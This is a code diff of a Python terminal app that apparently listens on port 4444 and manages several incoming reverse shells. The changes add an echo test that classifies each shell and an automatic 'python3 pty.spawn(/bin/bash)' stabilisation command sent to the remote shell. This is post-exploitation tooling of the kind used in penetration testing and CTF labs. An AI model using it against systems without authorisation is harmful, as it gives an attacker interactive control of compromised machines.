@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 
 import sys
+import traceback
 import time
 import termios
 import tty
@@ -71,7 +72,7 @@ class NShellsOnePortApp(App):
                                 else:
                                     session.writer.write(b)
                 except Exception as e:
-                    self.log_view.write(f"[-] exception in console_data_loop: {e}")
+                    self.log_view.write(f"[-] Exception in console_data_loop: {e}\n{traceback.format_exc()}")
             # WARNING: this also seems to silence errors
             await asyncio.get_running_loop().run_in_executor(None, console_data_loop)
 
@@ -90,6 +91,21 @@ class NShellsOnePortApp(App):
             self.session_list_view.extend([ListItem(Label(s.name), id=f"session_{s.session_id}") for s in self.session_list])
 
     async def rshell_client(self, reader, writer) -> None:
+        async def read_stream(reader, timeout=.5):
+            res = b""
+            async def read_all():
+                nonlocal res
+                while True:
+                    data = await reader.read(4096)
+                    if not data:
+                        break
+                    res += data
+            try:
+                await asyncio.wait_for(read_all(), timeout=timeout)
+            except TimeoutError:
+                pass
+            return res
+
         # errors here are silenced somehow so we need to catch them ourselves
         try:
             addr = writer.get_extra_info('peername')
@@ -106,62 +122,81 @@ class NShellsOnePortApp(App):
                 writer.write(b"\n\n\n")
                 await writer.drain()
                 # read any potentially remaining data (banner, leftover command output)
-                try:
-                    await asyncio.wait_for(reader.read(), timeout=.5)
-                except TimeoutError:
-                    pass
+                await read_stream(reader, timeout=1)
 
-                writer.write(b"echo ns1p\n")
-                await writer.drain()
-                stdin_echo = False
+                stdin_live_echo = False
+                stdin_late_echo = False
                 command_echo = False
-                data = None
-                try:
-                    data = await asyncio.wait_for(reader.readline(), timeout=.5)
-                    data += await asyncio.wait_for(reader.readline(), timeout=.5)
-                except TimeoutError:
-                    pass
+                writer.write(b"echo ns1p")
+                await writer.drain()
+                data = await read_stream(reader, timeout=.5)
 
                 if not data:
-                    self.log_view.write(f"[*] Session {session_id}: Reverse shell appears to be invalid (failed echo test with empty response data)")
-                elif b"ns1p" in data and not b"echo ns1p" in data:
-                    self.log_view.write(f"[*] Session {session_id}: Reverse shell reponds to echo command but doesn't echo inputs")
-                    command_echo = True
-                elif b"echo ns1p" in data and data.count(b"ns1p") == 2:
-                    self.log_view.write(f"[*] Session {session_id}: Reverse shell responds to echo and echos inputs")
-                    # cmd.exe and powershell echos the command only after pressing enter
-                    stdin_echo = True
-                    command_echo = True
+                    self.log_view.write(f"[*] Session {session_id}: Reverse shell does NOT live-echo inputs")
+                elif b"echo ns1p" in data:
+                    self.log_view.write(f"[*] Session {session_id}: Reverse shell does live-echo inputs")
+                    stdin_live_echo = True
                 else:
                     self.log_view.write(f"[*] Session {session_id}: Reverse shell appears to be invalid (failed echo test with invalid response data)")
 
-                return (stdin_echo, command_echo)
+                writer.write(b"\n")
+                await writer.drain()
+                data = await read_stream(reader, timeout=.5)
 
-            (stdin_echo, command_echo) = await shell_feature_check()
-            if command_echo and not stdin_echo:
+                if not data:
+                    self.log_view.write(f"[*] Session {session_id}: Reverse shell appears to be invalid (failed echo test with no response)")
+                elif not stdin_live_echo and b"ns1p" in data and not b"echo ns1p" in data:
+                    self.log_view.write(f"[*] Session {session_id}: Reverse shell reponds to echo commands but doesn't echo inputs")
+                    command_echo = True
+                elif b"echo ns1p" in data and data.count(b"ns1p") >= 2:
+                    stdin_late_echo = True
+                    command_echo = True
+                    if not stdin_live_echo:
+                        self.log_view.write(f"[*] Session {session_id}: Reverse shell responds to echo commands and echos inputs but only after sending newline")
+                        # cmd.exe and powershell echos the command only after pressing enter
+                    else:
+                        self.log_view.write(f"[*] Session {session_id}: Reverse shell responds to echo commands and echos inputs live AND after sending newline")
+                elif stdin_live_echo and data.count(b"ns1p") >= 2: #theoretically we should check == 2 but the count might be higher from e.g. PS1
+                    self.log_view.write(f"[*] Session {session_id}: Reverse shell reponds to echo commands and live-echos inputs")
+                else:
+                    self.log_view.write(f"[*] Session {session_id}: Reverse shell appears to be invalid (failed echo test with invalid response data: {data})")
+
+                return (stdin_live_echo, stdin_late_echo, command_echo)
+
+            (stdin_live_echo, stdin_late_echo, command_echo) = await shell_feature_check()
+            # this check in its current form does not stabilize on a pure bash reverse shell => no Ctrl-C
+            # it also attempts to linux stabilize a windows shell (although this doesnt break anything)
+            if command_echo and not stdin_live_echo:
                 self.log_view.write(f"[*] Session {session_id}: Attempting auto-stabilization using linux python3 payload")
                 writer.write(b"exec python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n")
                 await writer.drain()
-                (stdin_echo, command_echo) = await shell_feature_check()
+                (stdin_live_echo, stdin_late_echo, command_echo) = await shell_feature_check()
             # TODO: have some kind of readline mode
 
-            while True:
-                data = await reader.read(1024)
-                if not data:
-                    break
-                session.read_deque.append(data)
-                #self.log_view.write(f"Received: {data.decode()}")
+            # send a final newline to print PS1 again
+            writer.write(b"\n")
+            await writer.drain()
+
+            try:
+                while True:
+                    data = await reader.read(1024)
+                    if not data:
+                        break
+                    session.read_deque.append(data)
         
-            self.log_view.write(f"[*] session {session_name} closed")
-            writer.close()
-            await writer.wait_closed()
+                self.log_view.write(f"[*] session {session_name} closed")
+                writer.close()
+                await writer.wait_closed()
+            except ConnectionResetError:
+                self.log_view.write(f"[*] session {session_name} closed: connection reset")
+
             async with self.write_lock:
                 self.session_list.remove(session)
             await self.update_session_list_view()
             self.log_view.write(f"[*] session {session_name} removed")
 
         except Exception as e:
-            self.log_view.write(f"[-] Exception in rshell_client {e}")
+            self.log_view.write(f"[-] Exception in rshell_client {e}\n{traceback.format_exc()}")
     
     async def master_server(self, host='0.0.0.0', port=4444):
         server = await asyncio.start_server(self.rshell_client, host, port)
